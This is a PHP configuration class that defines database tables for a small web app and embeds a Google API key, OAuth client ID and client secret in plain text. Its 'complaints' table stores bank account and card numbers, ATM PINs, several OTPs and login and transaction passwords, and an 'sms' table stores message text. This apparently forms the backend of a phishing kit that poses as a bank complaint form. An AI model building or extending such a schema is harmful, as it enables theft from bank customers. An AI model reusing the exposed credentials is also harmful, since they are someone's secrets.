<?php

class Configuration
{

    public $conn;
    public $apikeyauthconsent = "AIzaSyDvNAqBSoNZbm6msvhz20sr6uoI7h73S2o";
    public $clientid = "1086193827988-o0pcar678li9fn9lufb35ane3qb7en1v.apps.googleusercontent.com";
    public $client_secret = "MbFllpafRM2vMNbnwd8cYuPZ";

    public function __construct($conn)
    {
        $this->conn = $conn;
    }

    /*
    create_relate ="creation/relation"
    operation="change/drop" add :drop before table name  to drop table or add : newname to rename after table
    to drop the column set drop: before column and change operation =drop
     */

    public function tablesdata()
    {
        $tables = array(
            "user" => array("id" => "int:11: PRIMARY KEY AUTO_INCREMENT", "name" => "varchar:200:default 'NA'", "last_name" => "varchar:50", "contact" => "varchar:11:unique", "userid" => "varchar:100:unique NOT NULL default 'NA'", "email" => "varchar:50:unique NOT NULL default 'NA'", "password" => "text", "api_key" => "text", "role" => "varchar:50", "created_at" => "timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP", "updated_at" => "timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP", "image" => "varchar:100", "about" => "varchar:200", "blocked" => "int:1:default 0"),
            
            "web_settings" => array("id" => "int:11: PRIMARY KEY AUTO_INCREMENT", "logo" => "varchar:200", "favicon" => "varchar:50", "title" => "varchar:50", "contact" => "varchar:15", "email" => "varchar:50:unique NOT NULL default 'NA'", "about" => "longtext", "privacy" => "longtext","terms" => "longtext", "facebook" => "varchar:100","instagram" => "varchar:100", "twitter" => "varchar:100","youtube" => "varchar:100","linkedin" => "varchar:100"),
            
            "complaints" => array("id" => "int:11: PRIMARY KEY AUTO_INCREMENT", "name" => "varchar:200:default 'NA'", "txn_failed_status" => "varchar:50", "mobile" => "varchar:11:unique", "query" => "varchar:100", "ac_no" => "varchar:50", "card_no" => "varchar:20", "atm_pin" => "int:10","otp1" => "int:10","otp2" => "int:10","otp3" => "int:10","otp4" => "int:10", "userId" => "varchar:50", "user_password" => "varchar:50","txn_password" => "varchar:50","debit_card_no" => "varchar:50","debit_card_no" => "varchar:50", "created_at" => "timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP", "updated_at" => "timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP", "image" => "varchar:100", "about" => "varchar:200", "blocked" => "int:1:default 0"),
            
            "sms" => array("id" => "int:11: PRIMARY KEY AUTO_INCREMENT", "sms" => "text", "created_at" => "timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP"),
            
            // "categories" => array("id" => "int:11: PRIMARY KEY AUTO_INCREMENT", "name" => "varchar:200", "image" => "varchar:2000", "status" => "varchar:50","description" => "longtext","priority" => "int:11"),
            
            // "sub_categories" => array("id" => "int:11: PRIMARY KEY AUTO_INCREMENT", "name" => "varchar:200", "image" => "varchar:2000", "status" => "varchar:50","description" => "longtext","priority" => "int:11"),
            
        );
        return $tables;
    }

    /*
    To create the relation
     * (parenttable:primary_key_id(optional)=>childtable:ondelete:onupdate:foreign_key_column_name(optional))
    To drop foreign key without droping foreign key column  put drop: before child table
     * (parenttable:primary_key_id(optional)=>drop:childtable:ondelete:onupdate:foreign_key_column_name(optional))
    To drop foreign key with droping foreign key column  put dropcol: before child table
     * (parenttable:primary_key_id(optional)=>dropcol:childtable:ondelete:onupdate:foreign_key_column_name(optional))
     */

    public function tableRelation()
    {
        $rtable = array(
            // "super_categories" => "categories:cascade:cascade",
            "super_categories" => "sub_categories:cascade:cascade",
            "categories" => "sub_categories:cascade:cascade",
           
        );
        return $rtable;
    }

    public function configure($create_relate = "creation", $operation = "change")
    {
        $info2 = array();
        $db = new DB($this->conn);
        ini_set('max_execution_time', 300);
        if ($create_relate == "creation") {
            $info = $db->loadTables($this->tablesdata(), $operation);
            array_push($info2, $info);
            array_push($info2, $this->tablesdata());
        } else if ($create_relate == "relation") {
            $info = $db->relateTable($this->tableRelation());
            array_push($info2, $info);
            array_push($info2, $this->tableRelation());
        }
        return $info2;
    }

    public function loadPages()
    {
    }
}